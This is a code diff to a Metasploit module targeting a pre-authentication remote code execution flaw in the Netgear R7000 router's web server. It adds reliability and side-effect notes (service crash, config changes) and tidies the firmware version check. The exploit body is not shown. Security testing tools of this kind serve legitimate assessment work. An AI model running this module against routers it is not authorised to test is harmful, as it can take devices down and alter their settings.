@@ -36,6 +36,12 @@ class MetasploitModule < Msf::Auxiliary
         'Targets' => [
           [ 'Netgear R7000', {} ]
         ],
+        'Notes' =>
+          {
+            'Reliability' => [ REPEATABLE_SESSION ],
+            'Stability' => [ CRASH_SERVICE_DOWN ],
+            'SideEffects' => [ CONFIG_CHANGES ]
+          },
         'References' =>
           [
             [ 'URL', 'https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r7000-httpd-preauth-rce/'],
@@ -63,11 +69,13 @@ class MetasploitModule < Msf::Auxiliary
     if res.nil?
       return Exploit::CheckCode::Unknown('Connection timed out.')
     end
+
     data = res.to_s
     firmware_version = data.match(%r{<b>Firmware Version</b><br>V(\d+\.\d+\.\d+\.\d+)})
     if firmware_version.nil?
       return Exploit::CheckCode::Unknown('Could not retrieve firmware version!')
     end
+
     firmware_version = Rex::Version.new(firmware_version[1])
     if firmware_version <= Rex::Version.new('1.0.11.116') || firmware_version == Rex::Version.new('1.0.11.208') || firmware_version == Rex::Version.new('1.0.11.204')
       return true
@@ -82,6 +90,7 @@ class MetasploitModule < Msf::Auxiliary
     if res.nil?
       return Exploit::CheckCode::Unknown('Connection timed out.')
     end
+
     # Checks for the `WWW-Authenticate` header in the response
     if res.headers['WWW-Authenticate']
       data = res.to_s
@@ -92,11 +101,11 @@ class MetasploitModule < Msf::Auxiliary
       if model == 'R7000' && check_vuln_firmware
         return Exploit::CheckCode::Vulnerable
       end
-      return Exploit::CheckCode::Safe
+
     else
       print_error('Router is not a NETGEAR router')
-      return Exploit::CheckCode::Safe
     end
+    return Exploit::CheckCode::Safe
   end
 
   def fake_logins_to_ease_heap
